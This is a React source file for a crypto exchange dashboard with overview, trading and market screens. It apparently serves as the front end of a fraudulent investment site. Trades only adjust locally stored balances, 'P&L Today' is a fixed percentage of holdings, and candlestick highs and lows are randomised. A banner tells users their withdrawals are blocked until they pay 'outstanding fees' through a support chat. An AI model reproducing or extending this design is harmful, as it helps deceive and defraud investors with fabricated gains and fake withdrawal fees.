import { useState, useCallback, useMemo, useEffect, useRef } from "react";
import { useApp, usePrices, COINS, BASE_PRICES, fmt, fmtCrypto, coinInfo } from "./AppContext";
import { C, S, btn } from "./theme";
import { Spark, MiniChart, CoinIcon, Tag, EmptyState } from "./components";

// ─── OVERVIEW ─────────────────────────────────────────────────────────────────
export function DashOverview() {
  const { user, updateUser, addTx, getTxs, setModal, setDashTab, showAlert, showToast, getUserFeeReqs, getUserWallet, hasPendingFees } = useApp();
  const prices = usePrices();
  const [coin,   setCoin]   = useState("BTC");
  const [side,   setSide]   = useState("buy");
  const [amount, setAmount] = useState("");

  const holdings    = user?.holdings || [];
  const txs         = getTxs(user?.email);
  const pendingFees = getUserFeeReqs(user?.email);
  const wallet      = getUserWallet(user?.email);

  const totalCryptoValue = useMemo(() =>
    holdings.reduce((sum, h) => sum + h.qty * (prices[h.sym]?.price || 0), 0),
  [holdings, prices]);

  const totalVal = (user?.balance || 0) + totalCryptoValue;

  const doTrade = useCallback(() => {
    const amt = Number(amount);
    if (!amt || amt <= 0) { showAlert("Enter a valid amount"); return; }
    const price = prices[coin]?.price || 1;
    const qty   = +(amt / price).toFixed(8);
    const hs    = [...(user.holdings || [])];
    if (side === "buy") {
      if (amt > user.balance) { showAlert("Insufficient balance"); return; }
      const idx = hs.findIndex(h => h.sym === coin);
      if (idx !== -1) {
        const old = hs[idx];
        const newQty = +(old.qty + qty).toFixed(8);
        const newAvg = ((old.qty * old.avgBuy) + (qty * price)) / newQty;
        hs[idx] = { ...old, qty: newQty, avgBuy: +newAvg.toFixed(2) };
      } else {
        hs.push({ sym: coin, qty, avgBuy: +price.toFixed(2) });
      }
      updateUser({ ...user, balance: +(user.balance - amt).toFixed(2), portfolio: +(user.portfolio + amt).toFixed(2), holdings: hs });
      addTx(user.email, { id:`TX${Date.now()}`, type:"Buy", symbol:coin, amount:qty, value:amt, fee:+(amt*.001).toFixed(2), status:"Completed", date:new Date().toLocaleDateString() });
      showToast(`✅ Bought ${fmtCrypto(qty)} ${coin} for $${fmt(amt)}`, "success");
    } else {
      const h = hs.find(h => h.sym === coin);
      if (!h || qty > h.qty) { showAlert(`Insufficient ${coin}`); return; }
      const newHs = hs.map(h => h.sym === coin ? { ...h, qty: +(h.qty - qty).toFixed(8) } : h).filter(h => h.qty > 0);
      updateUser({ ...user, balance: +(user.balance + amt).toFixed(2), portfolio: Math.max(0, +(user.portfolio - amt).toFixed(2)), holdings: newHs });
      addTx(user.email, { id:`TX${Date.now()}`, type:"Sell", symbol:coin, amount:qty, value:amt, fee:+(amt*.001).toFixed(2), status:"Completed", date:new Date().toLocaleDateString() });
      showToast(`✅ Sold ${fmtCrypto(qty)} ${coin} for $${fmt(amt)}`, "success");
    }
    setAmount("");
  }, [amount, coin, side, prices, user, updateUser, addTx, showAlert, showToast]);

  return (
    <div>
      {pendingFees.length > 0 && (
        <div style={{ background:"rgba(255,200,0,.1)", border:"1px solid rgba(255,200,0,.4)", borderRadius:12, padding:"16px 18px", marginBottom:20 }}>
          <div style={{ fontWeight:700, color:C.gold, fontSize:14, marginBottom:6 }}>⚠️ Outstanding Fee — Action Required</div>
          <div style={{ fontSize:13, color:C.text2, marginBottom:12 }}>Withdrawals are <strong style={{ color:C.gold }}>blocked</strong> until all fees are settled. Contact support for payment instructions.</div>
          {pendingFees.map(f => (
            <div key={f.id} style={{ ...S.scard, marginBottom:10, display:"flex", alignItems:"center", justifyContent:"space-between", flexWrap:"wrap", gap:10 }}>
              <div>
                <div style={{ fontSize:14, fontWeight:700, color:C.text }}>{f.reason}</div>
                <div style={{ fontSize:13, color:C.gold, marginTop:2 }}>Amount due: {f.amount} {f.currency}</div>
              </div>
              <button style={{ ...btn("primary"), padding:"9px 18px", fontSize:13 }}
                onClick={() => { if(window.Tawk_API&&window.Tawk_API.maximize){window.Tawk_API.maximize();}else{window.open('https://tawk.to/chat/6a2e5fe88b30661d42bef351/1jr2id950','_blank');} }}>
                💬 Contact Support
              </button>
            </div>
          ))}
        </div>
      )}

      {wallet && (
        <div style={{ background:"rgba(255,200,0,.06)", border:`1px solid rgba(255,200,0,.25)`, borderRadius:12, padding:"14px 18px", marginBottom:20, display:"flex", alignItems:"center", justifyContent:"space-between", flexWrap:"wrap", gap:12 }}>
          <div>
            <div style={{ fontWeight:700, color:C.gold, fontSize:14 }}>💰 Deposit Address Ready</div>
            <div style={{ fontSize:13, color:C.text2, marginTop:4 }}>Your {wallet.coin} deposit address has been assigned.</div>
          </div>
          <button style={{ ...btn(), padding:"9px 20px" }} onClick={() => setModal("deposit")}>View Address</button>
        </div>
      )}

      <div style={{ ...S.rowsb, marginBottom:22, flexWrap:"wrap", gap:12 }}>
        <div>
          <div style={S.hd}>Good day, {user?.name?.split(" ")[0]} 👋</div>
          <div style={S.sub}>Here's your account overview</div>
        </div>
        <div style={S.row}>
          <button style={{ ...btn("success"), padding:"9px 18px" }} onClick={() => setModal("deposit")}>+ Deposit</button>
          <button style={{ ...btn(), padding:"9px 18px" }} onClick={() => setModal("send")}>↗ Withdraw</button>
          <button style={{ ...btn("ghost"), padding:"9px 18px" }} onClick={() => setDashTab("trade")}>📈 Trade</button>
        </div>
      </div>

      <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(160px, 1fr))", gap:14, marginBottom:22 }}>
        {[
          { label:"Total Balance",    val:"$"+fmt(totalVal),           sub:"All assets",       c:"#ffc800" },
          { label:"Available Cash",   val:"$"+fmt(user?.balance||0),   sub:"Ready to use",     c:C.green },
          { label:"Crypto Value",     val:"$"+fmt(totalCryptoValue),   sub:holdings.length+" assets", c:"#60a5fa" },
          { label:"P&L Today",        val:(totalCryptoValue>0?"+":"")+fmt(totalCryptoValue*.002,2), sub:"Estimated",  c:C.green },
        ].map((s,i) => (
          <div key={i} style={{ ...S.card, position:"relative", overflow:"hidden" }}>
            <div style={{ position:"absolute", top:-12, right:-12, width:70, height:70, borderRadius:"50%", background:s.c+"15" }}/>
            <div style={{ fontSize:10, color:C.text3, textTransform:"uppercase", letterSpacing:".06em", marginBottom:8 }}>{s.label}</div>
            <div style={{ fontSize:22, fontWeight:800, color:C.text }}>{s.val}</div>
            <div style={{ fontSize:11, color:s.c, marginTop:5 }}>{s.sub}</div>
          </div>
        ))}
      </div>

      <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(280px, 1fr))", gap:16 }}>
        <div style={S.card}>
          <div style={{ fontSize:16, fontWeight:700, color:C.text, marginBottom:16 }}>Quick Trade</div>
          <div style={{ display:"flex", gap:8, marginBottom:16 }}>
            {["buy","sell"].map(s => (
              <button key={s} style={{ ...btn(side===s?(s==="buy"?"success":"danger"):"ghost"), flex:1, padding:"10px" }} onClick={() => setSide(s)}>
                {s==="buy" ? "▲ Buy" : "▼ Sell"}
              </button>
            ))}
          </div>
          <div style={{ marginBottom:14 }}>
            <label style={S.label}>Asset</label>
            <select style={S.sel} value={coin} onChange={e => setCoin(e.target.value)}>
              {COINS.map(c => <option key={c.sym} value={c.sym}>{c.sym} — ${prices[c.sym]?.price < 1 ? prices[c.sym]?.price.toFixed(4) : fmt(prices[c.sym]?.price)}</option>)}
            </select>
          </div>
          <div style={{ marginBottom:16 }}>
            <label style={S.label}>Amount (USD)</label>
            <input style={S.inp} placeholder="0.00" type="number" value={amount} onChange={e => setAmount(e.target.value)} onKeyDown={e => e.key==="Enter" && doTrade()} />
          </div>
          {amount && Number(amount) > 0 && (
            <div style={{ ...S.scard, marginBottom:14, fontSize:13 }}>
              <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                <span style={{ color:C.text3 }}>You {side}</span>
                <strong style={{ color:C.text }}>{fmtCrypto(Number(amount)/(prices[coin]?.price||1))} {coin}</strong>
              </div>
              <div style={{ display:"flex", justifyContent:"space-between" }}>
                <span style={{ color:C.text3 }}>Fee (0.10%)</span>
                <span style={{ color:C.gold }}>${(Number(amount)*.001).toFixed(2)}</span>
              </div>
            </div>
          )}
          <button style={{ ...btn(side==="buy"?"success":"danger"), width:"100%", padding:"12px", fontSize:14 }} onClick={doTrade}>
            {side==="buy" ? `Buy ${coin}` : `Sell ${coin}`}
          </button>
          <div style={{ marginTop:10, textAlign:"center" }}>
            <span style={{ fontSize:12, color:C.gold, cursor:"pointer" }} onClick={() => setDashTab("trade")}>
              Advanced trading chart →
            </span>
          </div>
        </div>

        <div style={S.card}>
          <div style={{ ...S.rowsb, marginBottom:16 }}>
            <div style={{ fontSize:16, fontWeight:700, color:C.text }}>My Portfolio</div>
            <button style={{ ...btn("ghost"), padding:"5px 12px", fontSize:12 }} onClick={() => setDashTab("portfolio")}>Full view →</button>
          </div>
          {holdings.length === 0 ? (
            <div style={{ textAlign:"center", padding:"30px 0" }}>
              <div style={{ fontSize:32, marginBottom:12 }}>💼</div>
              <div style={{ fontSize:14, color:C.text2, marginBottom:8 }}>No crypto holdings yet</div>
              <button style={{ ...btn("success"), padding:"8px 20px", fontSize:13 }} onClick={() => setModal("deposit")}>+ Deposit Now</button>
            </div>
          ) : holdings.slice(0,5).map((h,i) => {
            const ci = coinInfo(h.sym), p = prices[h.sym];
            const val = h.qty * (p?.price||0);
            const pnl = val - (h.qty * (h.avgBuy||0));
            return (
              <div key={h.sym} style={{ ...S.rowsb, padding:"11px 0", borderBottom:i<holdings.length-1?`1px solid ${C.border2}`:"none" }}>
                <div style={S.row}>
                  <CoinIcon sym={h.sym} size={32}/>
                  <div>
                    <div style={{ fontWeight:700, fontSize:14, color:C.text }}>{h.sym}</div>
                    <div style={{ fontSize:12, color:C.text3 }}>{fmtCrypto(h.qty)} {h.sym}</div>
                  </div>
                </div>
                <div style={{ textAlign:"right" }}>
                  <div style={{ fontWeight:700, fontSize:14, color:C.text }}>${fmt(val)}</div>
                  <div style={{ fontSize:11, color:pnl>=0?C.green:C.red }}>{pnl>=0?"+":""}{fmt(pnl)}</div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      <div style={{ ...S.card, marginTop:18 }}>
        <div style={{ ...S.rowsb, marginBottom:16 }}>
          <span style={{ fontSize:16, fontWeight:700, color:C.text }}>Recent Activity</span>
          <button style={{ ...btn("ghost"), padding:"5px 14px", fontSize:12 }} onClick={() => setDashTab("history")}>View all →</button>
        </div>
        {txs.length === 0 ? <EmptyState icon="📋" text="No transactions yet." /> : (
          <div style={{ overflowX:"auto", WebkitOverflowScrolling:"touch" }}>
            <table style={S.tbl}>
              <thead><tr>{["Type","Asset","Amount","Value","Status","Date"].map(h => <th key={h} style={S.th}>{h}</th>)}</tr></thead>
              <tbody>
                {txs.slice(0,6).map(tx => (
                  <tr key={tx.id}>
                    <td style={S.td}><Tag c={tx.type==="Buy"?"purple":tx.type==="Sell"?"yellow":tx.type==="Deposit"?"green":"red"}>{tx.type}</Tag></td>
                    <td style={{ ...S.td, fontWeight:700 }}><div style={S.row}><CoinIcon sym={tx.symbol} size={18}/>{tx.symbol}</div></td>
                    <td style={{ ...S.td, fontFamily:"monospace" }}>{fmtCrypto(tx.amount)}</td>
                    <td style={{ ...S.td, fontFamily:"monospace" }}>${fmt(tx.value)}</td>
                    <td style={S.td}><Tag c={tx.status==="Completed"?"green":"yellow"}>{tx.status}</Tag></td>
                    <td style={{ ...S.td, color:C.text3 }}>{tx.date}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}

// ─── TRADING (replaces Staking) ───────────────────────────────────────────────
export function DashTrading() {
  const { user, updateUser, addTx, showAlert, showToast } = useApp();
  const prices = usePrices();

  const [selectedCoin, setSelectedCoin] = useState("BTC");
  const [side,         setSide]         = useState("buy");
  const [orderType,    setOrderType]    = useState("market");
  const [amount,       setAmount]       = useState("");
  const [limitPrice,   setLimitPrice]   = useState("");
  const [chartType,    setChartType]    = useState("line");

  const canvasRef = useRef(null);
  const priceHistory = useRef({});

  const coin    = COINS.find(c => c.sym === selectedCoin) || COINS[0];
  const pData   = prices[selectedCoin] || { price:0, change:0, spark:[], high:0, low:0 };
  const holding = user?.holdings?.find(h => h.sym === selectedCoin);

  // Build price history for the chart
  useEffect(() => {
    if (!priceHistory.current[selectedCoin]) {
      priceHistory.current[selectedCoin] = [...(pData.spark || [])];
    } else {
      const hist = priceHistory.current[selectedCoin];
      if (pData.price && hist[hist.length-1] !== pData.price) {
        hist.push(pData.price);
        if (hist.length > 100) hist.shift();
      }
    }
  }, [prices, selectedCoin]);

  // Draw chart on canvas
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    const W = canvas.width, H = canvas.height;
    ctx.clearRect(0, 0, W, H);

    const data = priceHistory.current[selectedCoin] || pData.spark || [];
    if (data.length < 2) return;

    const mn = Math.min(...data), mx = Math.max(...data);
    const range = mx - mn || 1;
    const pad = { t:20, r:80, b:40, l:10 };
    const cW = W - pad.l - pad.r, cH = H - pad.t - pad.b;

    const px = (i) => pad.l + (i / (data.length-1)) * cW;
    const py = (v) => pad.t + cH - ((v - mn) / range) * cH;

    // Grid
    ctx.strokeStyle = "rgba(255,200,0,.06)";
    ctx.lineWidth = 0.5;
    for (let i = 0; i <= 5; i++) {
      const y = pad.t + (i/5) * cH;
      ctx.beginPath(); ctx.moveTo(pad.l, y); ctx.lineTo(W-pad.r, y); ctx.stroke();
      const val = mx - (i/5) * range;
      ctx.fillStyle = "rgba(255,200,0,.4)";
      ctx.font = "10px monospace";
      ctx.textAlign = "left";
      ctx.fillText("$"+fmt(val), W-pad.r+6, y+4);
    }

    const up = data[data.length-1] >= data[0];
    const lineColor = up ? "#30d158" : "#e8000d";

    if (chartType === "candle") {
      // Candlestick chart
      const candleW = Math.max(2, cW/data.length - 1);
      for (let i = 1; i < data.length; i++) {
        const open = data[i-1], close = data[i];
        const high = Math.max(open, close) * (1 + Math.random()*.003);
        const low  = Math.min(open, close) * (1 - Math.random()*.003);
        const isUp = close >= open;
        const color = isUp ? "#22c55e" : "#ef4444";
        const x = px(i);
        // Wick
        ctx.strokeStyle = color;
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(x, py(high));
        ctx.lineTo(x, py(low));
        ctx.stroke();
        // Body
        ctx.fillStyle = color;
        const bodyTop = py(Math.max(open, close));
        const bodyH   = Math.max(1, Math.abs(py(open) - py(close)));
        ctx.fillRect(x - candleW/2, bodyTop, candleW, bodyH);
      }
    } else {
      // Line chart with area
      ctx.beginPath();
      data.forEach((v, i) => i===0 ? ctx.moveTo(px(i), py(v)) : ctx.lineTo(px(i), py(v)));
      ctx.strokeStyle = lineColor;
      ctx.lineWidth = 2;
      ctx.lineJoin = "round";
      ctx.stroke();

      // Area fill
      ctx.beginPath();
      ctx.moveTo(px(0), py(data[0]));
      data.forEach((v, i) => ctx.lineTo(px(i), py(v)));
      ctx.lineTo(px(data.length-1), pad.t+cH);
      ctx.lineTo(px(0), pad.t+cH);
      ctx.closePath();
      const grad = ctx.createLinearGradient(0, pad.t, 0, pad.t+cH);
      grad.addColorStop(0, lineColor+"40");
      grad.addColorStop(1, lineColor+"00");
      ctx.fillStyle = grad;
      ctx.fill();

      // Current price dot
      const last = data[data.length-1];
      const lx = px(data.length-1), ly = py(last);
      ctx.beginPath();
      ctx.arc(lx, ly, 4, 0, Math.PI*2);
      ctx.fillStyle = lineColor;
      ctx.fill();

      // Price label
      ctx.fillStyle = lineColor;
      ctx.font = "bold 11px monospace";
      ctx.textAlign = "left";
      ctx.fillText("$"+fmt(last), W-pad.r+6, ly+4);
    }

    // Time labels
    ctx.fillStyle = "rgba(255,200,0,.3)";
    ctx.font = "9px monospace";
    ctx.textAlign = "center";
    ["1h","2h","3h","4h","5h","Now"].forEach((l,i) => {
      ctx.fillText(l, pad.l + (i/5)*cW, H-8);
    });

  }, [prices, selectedCoin, chartType, pData]);

  const doTrade = useCallback(() => {
    const amt = Number(amount);
    if (!amt || amt <= 0) { showAlert("Enter a valid amount"); return; }
    const price = orderType === "limit" ? Number(limitPrice) : (prices[selectedCoin]?.price || 1);
    if (orderType === "limit" && !price) { showAlert("Enter a limit price"); return; }
    const qty = +(amt / price).toFixed(8);
    const hs  = [...(user?.holdings || [])];

    if (side === "buy") {
      if (amt > (user?.balance||0)) { showAlert("Insufficient balance"); return; }
      const idx = hs.findIndex(h => h.sym === selectedCoin);
      if (idx !== -1) {
        const old = hs[idx];
        const newQty = +(old.qty + qty).toFixed(8);
        const newAvg = ((old.qty*(old.avgBuy||price)) + (qty*price)) / newQty;
        hs[idx] = { ...old, qty:newQty, avgBuy:+newAvg.toFixed(2) };
      } else {
        hs.push({ sym:selectedCoin, qty, avgBuy:+price.toFixed(2) });
      }
      updateUser({ ...user, balance:+(user.balance-amt).toFixed(2), portfolio:+(user.portfolio+amt).toFixed(2), holdings:hs });
      addTx(user.email, { id:`TX${Date.now()}`, type:"Buy", symbol:selectedCoin, amount:qty, value:amt, fee:+(amt*.001).toFixed(2), status:"Completed", date:new Date().toLocaleDateString() });
      showToast(`✅ Bought ${fmtCrypto(qty)} ${selectedCoin} @ $${fmt(price)}`, "success");
    } else {
      const h = hs.find(h => h.sym === selectedCoin);
      if (!h || qty > h.qty) { showAlert(`Insufficient ${selectedCoin} — you have ${fmtCrypto(h?.qty||0)}`); return; }
      const newHs = hs.map(h => h.sym===selectedCoin ? {...h, qty:+(h.qty-qty).toFixed(8)} : h).filter(h=>h.qty>0);
      updateUser({ ...user, balance:+(user.balance+amt).toFixed(2), portfolio:Math.max(0,+(user.portfolio-amt).toFixed(2)), holdings:newHs });
      addTx(user.email, { id:`TX${Date.now()}`, type:"Sell", symbol:selectedCoin, amount:qty, value:amt, fee:+(amt*.001).toFixed(2), status:"Completed", date:new Date().toLocaleDateString() });
      showToast(`✅ Sold ${fmtCrypto(qty)} ${selectedCoin} @ $${fmt(price)}`, "success");
    }
    setAmount(""); setLimitPrice("");
  }, [amount, limitPrice, orderType, side, selectedCoin, prices, user, updateUser, addTx, showAlert, showToast]);

  const up = (pData.change||0) >= 0;

  return (
    <div>
      <div style={{ ...S.rowsb, marginBottom:18 }}>
        <div style={S.hd}>Trading</div>
        <div style={{ fontSize:13, color:C.text3 }}><span style={S.ldot}/>Live prices</div>
      </div>

      {/* Coin selector tabs */}
      <div style={{ display:"flex", gap:6, marginBottom:16, flexWrap:"wrap" }}>
        {COINS.map(c => {
          const p = prices[c.sym];
          const isUp = (p?.change||0) >= 0;
          const active = selectedCoin === c.sym;
          return (
            <button key={c.sym}
              style={{ padding:"8px 14px", borderRadius:10, border:`1.5px solid ${active?"rgba(255,200,0,.6)":"rgba(255,255,255,.06)"}`, background:active?"rgba(255,200,0,.1)":"rgba(255,255,255,.03)", cursor:"pointer", fontFamily:"inherit", transition:"all .15s" }}
              onClick={() => setSelectedCoin(c.sym)}>
              <div style={{ fontSize:12, fontWeight:700, color:active?"#ffc800":C.text }}>{c.sym}</div>
              <div style={{ fontSize:11, color:isUp?C.green:C.red, fontFamily:"monospace" }}>
                {isUp?"+":""}{fmt(p?.change||0)}%
              </div>
            </button>
          );
        })}
      </div>

      {/* Price header */}
      <div style={{ ...S.card, marginBottom:16, padding:"16px 20px" }}>
        <div style={{ display:"flex", alignItems:"center", gap:14, flexWrap:"wrap" }}>
          <CoinIcon sym={selectedCoin} size={36}/>
          <div>
            <div style={{ fontSize:13, color:C.text3 }}>{coin.name} / USD</div>
            <div style={{ fontSize:32, fontWeight:800, color:C.text, fontFamily:"monospace" }}>
              ${pData.price < 1 ? pData.price.toFixed(4) : fmt(pData.price)}
            </div>
          </div>
          <div style={{ display:"flex", gap:20, marginLeft:"auto", flexWrap:"wrap" }}>
            {[
              { l:"24h Change", v:(up?"+":"")+fmt(pData.change)+"%", c:up?C.green:C.red },
              { l:"24h High",   v:"$"+fmt(pData.high||pData.price*1.03), c:C.green },
              { l:"24h Low",    v:"$"+fmt(pData.low||pData.price*0.97),  c:C.red },
              { l:"Volume",     v:"$"+fmt((pData.vol||pData.price*21000)/1000,1)+"K", c:C.text2 },
            ].map((s,i) => (
              <div key={i} style={{ textAlign:"center" }}>
                <div style={{ fontSize:10, color:C.text3, textTransform:"uppercase", letterSpacing:".06em", marginBottom:4 }}>{s.l}</div>
                <div style={{ fontSize:14, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      <div style={{ display:"grid", gridTemplateColumns:"1fr 320px", gap:16 }}>
        {/* Chart */}
        <div style={S.card}>
          <div style={{ ...S.rowsb, marginBottom:12 }}>
            <span style={{ fontSize:14, fontWeight:700, color:C.text }}>{selectedCoin}/USD Chart</span>
            <div style={{ display:"flex", gap:6 }}>
              {["line","candle"].map(t => (
                <button key={t} style={{ ...btn(chartType===t?"primary":"ghost"), padding:"5px 14px", fontSize:12 }} onClick={() => setChartType(t)}>
                  {t === "line" ? "📈 Line" : "🕯 Candle"}
                </button>
              ))}
            </div>
          </div>
          <canvas ref={canvasRef} width={700} height={320} style={{ width:"100%", height:320, display:"block" }}/>

          {/* Mini coin overview */}
          <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(100px, 1fr))", gap:8, marginTop:14 }}>
            {COINS.slice(0,8).map(c => {
              const p = prices[c.sym];
              const up = (p?.change||0) >= 0;
              return (
                <div key={c.sym} style={{ ...S.scard, padding:"8px 10px", cursor:"pointer", border:selectedCoin===c.sym?"1px solid rgba(255,200,0,.4)":"1px solid rgba(255,255,255,.05)", transition:"border .15s" }}
                  onClick={() => setSelectedCoin(c.sym)}>
                  <div style={{ fontSize:11, fontWeight:700, color:C.text }}>{c.sym}</div>
                  <div style={{ fontSize:11, fontFamily:"monospace", color:C.text2 }}>${p?.price<1?p?.price?.toFixed(3):fmt(p?.price)}</div>
                  <div style={{ fontSize:10, color:up?C.green:C.red }}>{up?"+":""}{fmt(p?.change)}%</div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Order panel */}
        <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
          <div style={S.card}>
            {/* Buy/Sell toggle */}
            <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:0, marginBottom:16, borderRadius:10, overflow:"hidden", border:"1px solid rgba(255,255,255,.08)" }}>
              <button style={{ padding:"12px", border:"none", cursor:"pointer", fontFamily:"inherit", fontSize:14, fontWeight:700, background:side==="buy"?"#22c55e":"transparent", color:side==="buy"?"#fff":C.text3, transition:"all .15s" }} onClick={() => setSide("buy")}>Buy</button>
              <button style={{ padding:"12px", border:"none", cursor:"pointer", fontFamily:"inherit", fontSize:14, fontWeight:700, background:side==="sell"?"#ef4444":"transparent", color:side==="sell"?"#fff":C.text3, transition:"all .15s" }} onClick={() => setSide("sell")}>Sell</button>
            </div>

            {/* Order type */}
            <div style={{ display:"flex", gap:6, marginBottom:16 }}>
              {["market","limit"].map(t => (
                <button key={t} style={{ ...btn(orderType===t?"primary":"ghost"), flex:1, padding:"8px", fontSize:12, textTransform:"capitalize" }} onClick={() => setOrderType(t)}>
                  {t}
                </button>
              ))}
            </div>

            {/* Available */}
            <div style={{ ...S.scard, marginBottom:14, padding:"10px 14px" }}>
              <div style={{ display:"flex", justifyContent:"space-between", fontSize:12 }}>
                <span style={{ color:C.text3 }}>Available</span>
                <span style={{ color:C.green, fontWeight:700 }}>
                  {side==="buy" ? "$"+fmt(user?.balance||0) : fmtCrypto(holding?.qty||0)+" "+selectedCoin}
                </span>
              </div>
            </div>

            {orderType === "limit" && (
              <div style={{ marginBottom:14 }}>
                <label style={S.label}>Limit Price (USD)</label>
                <input style={S.inp} type="number" placeholder={fmt(pData.price)} value={limitPrice} onChange={e => setLimitPrice(e.target.value)}/>
              </div>
            )}

            <div style={{ marginBottom:16 }}>
              <label style={S.label}>Amount (USD)</label>
              <input style={S.inp} type="number" placeholder="0.00" value={amount} onChange={e => setAmount(e.target.value)} onKeyDown={e => e.key==="Enter" && doTrade()}/>
              {/* Quick % buttons */}
              <div style={{ display:"flex", gap:6, marginTop:8 }}>
                {[25,50,75,100].map(pct => (
                  <button key={pct} style={{ ...btn("ghost"), flex:1, padding:"5px", fontSize:11 }}
                    onClick={() => {
                      const avail = side==="buy" ? (user?.balance||0) : (holding?.qty||0)*(pData.price||1);
                      setAmount(((avail*pct/100).toFixed(2)));
                    }}>
                    {pct}%
                  </button>
                ))}
              </div>
            </div>

            {amount && Number(amount) > 0 && (
              <div style={{ ...S.scard, marginBottom:14, fontSize:12 }}>
                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                  <span style={{ color:C.text3 }}>Qty</span>
                  <span style={{ color:C.text, fontFamily:"monospace" }}>{fmtCrypto(Number(amount)/(orderType==="limit"&&limitPrice?Number(limitPrice):pData.price||1))} {selectedCoin}</span>
                </div>
                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                  <span style={{ color:C.text3 }}>Price</span>
                  <span style={{ color:C.text, fontFamily:"monospace" }}>${fmt(orderType==="limit"&&limitPrice?Number(limitPrice):pData.price)}</span>
                </div>
                <div style={{ display:"flex", justifyContent:"space-between" }}>
                  <span style={{ color:C.text3 }}>Fee</span>
                  <span style={{ color:C.gold }}>${(Number(amount)*.001).toFixed(3)}</span>
                </div>
              </div>
            )}

            <button style={{ ...btn(side==="buy"?"success":"danger"), width:"100%", padding:"14px", fontSize:15, fontWeight:700 }} onClick={doTrade}>
              {side==="buy" ? `Buy ${selectedCoin}` : `Sell ${selectedCoin}`}
            </button>
          </div>

          {/* My position */}
          {holding && (
            <div style={S.card}>
              <div style={{ fontSize:13, fontWeight:700, color:C.text, marginBottom:12 }}>My {selectedCoin} Position</div>
              {[
                { l:"Holdings",  v:fmtCrypto(holding.qty)+" "+selectedCoin },
                { l:"Avg Buy",   v:"$"+fmt(holding.avgBuy||0) },
                { l:"Current",   v:"$"+fmt(pData.price) },
                { l:"Value",     v:"$"+fmt(holding.qty*(pData.price||0)) },
                { l:"P&L",       v:(()=>{const pnl=holding.qty*(pData.price||0)-holding.qty*(holding.avgBuy||0);return (pnl>=0?"+":"")+fmt(pnl);})() },
              ].map((r,i) => (
                <div key={i} style={{ display:"flex", justifyContent:"space-between", padding:"7px 0", borderBottom:i<4?`1px solid ${C.border2}`:"none" }}>
                  <span style={{ fontSize:12, color:C.text3 }}>{r.l}</span>
                  <span style={{ fontSize:12, fontWeight:600, color:r.l==="P&L"?(holding.qty*(pData.price||0)-holding.qty*(holding.avgBuy||0)>=0?C.green:C.red):C.text, fontFamily:"monospace" }}>{r.v}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── MARKETS ──────────────────────────────────────────────────────────────────
export function DashMarkets() {
  const prices = usePrices();
  const { setDashTab } = useApp();
  const [search, setSearch] = useState("");
  const filtered = COINS.filter(c => c.sym.toLowerCase().includes(search.toLowerCase()) || c.name.toLowerCase().includes(search.toLowerCase()));

  return (
    <div>
      <div style={S.hd}>Live Markets</div>
      <div style={S.sub}><span style={S.ldot}/>Prices updating every 2.5 seconds</div>
      <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(200px, 1fr))", gap:14, marginBottom:22 }}>
        {COINS.slice(0,4).map(coin => {
          const p = prices[coin.sym], up = p.change >= 0;
          return (
            <div key={coin.sym} style={{ ...S.card, cursor:"pointer" }} onClick={() => setDashTab("trade")}>
              <div style={S.rowsb}>
                <div style={S.row}><CoinIcon sym={coin.sym} size={28}/><div><div style={{ fontSize:14, fontWeight:700, color:C.text }}>{coin.sym}</div><div style={{ fontSize:11, color:C.text3 }}>{coin.name}</div></div></div>
                <Tag c={up?"green":"red"}>{up?"+":""}{fmt(p.change)}%</Tag>
              </div>
              <div style={{ fontSize:22, fontWeight:800, color:C.text, margin:"10px 0" }}>${p.price<1?p.price.toFixed(4):fmt(p.price)}</div>
              <MiniChart prices={p.spark} color={up?"#ffc800":C.red}/>
            </div>
          );
        })}
      </div>
      <div style={S.card}>
        <div style={{ ...S.rowsb, marginBottom:16 }}>
          <span style={{ fontSize:16, fontWeight:700, color:C.text }}>All Markets</span>
          <input style={{ ...S.inp, width:200, padding:"7px 12px", fontSize:13 }} placeholder="Search…" value={search} onChange={e => setSearch(e.target.value)}/>
        </div>
        <div style={{ overflowX:"auto", WebkitOverflowScrolling:"touch" }}>
          <table style={S.tbl}>
            <thead><tr>{["Asset","Price","24h Change","High","Low","Volume","Chart","Action"].map(h => <th key={h} style={S.th}>{h}</th>)}</tr></thead>
            <tbody>
              {filtered.map((coin,i) => {
                const p = prices[coin.sym], up = p.change >= 0;
                return (
                  <tr key={coin.sym}>
                    <td style={S.td}><div style={S.row}><CoinIcon sym={coin.sym} size={26}/><div><div style={{ fontWeight:700, color:C.text }}>{coin.sym}</div><div style={{ fontSize:11, color:C.text3 }}>{coin.name}</div></div></div></td>
                    <td style={{ ...S.td, fontFamily:"monospace", fontWeight:700, color:C.text }}>${p.price<1?p.price.toFixed(4):fmt(p.price)}</td>
                    <td style={S.td}><span style={{ color:up?C.green:C.red, fontWeight:600 }}>{up?"+":""}{fmt(p.change)}%</span></td>
                    <td style={{ ...S.td, fontFamily:"monospace", color:C.green }}>${fmt(p.high||p.price*1.03)}</td>
                    <td style={{ ...S.td, fontFamily:"monospace", color:C.red }}>${fmt(p.low||p.price*0.97)}</td>
                    <td style={{ ...S.td, fontFamily:"monospace" }}>${fmt((p.vol||p.price*21000)/1000,1)}K</td>
                    <td style={S.td}><Spark data={p.spark} color={up?"#ffc800":C.red} w={80} h={28}/></td>
                    <td style={S.td}><button style={{ ...btn("success"), padding:"5px 14px", fontSize:12 }} onClick={() => setDashTab("trade")}>Trade</button></td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

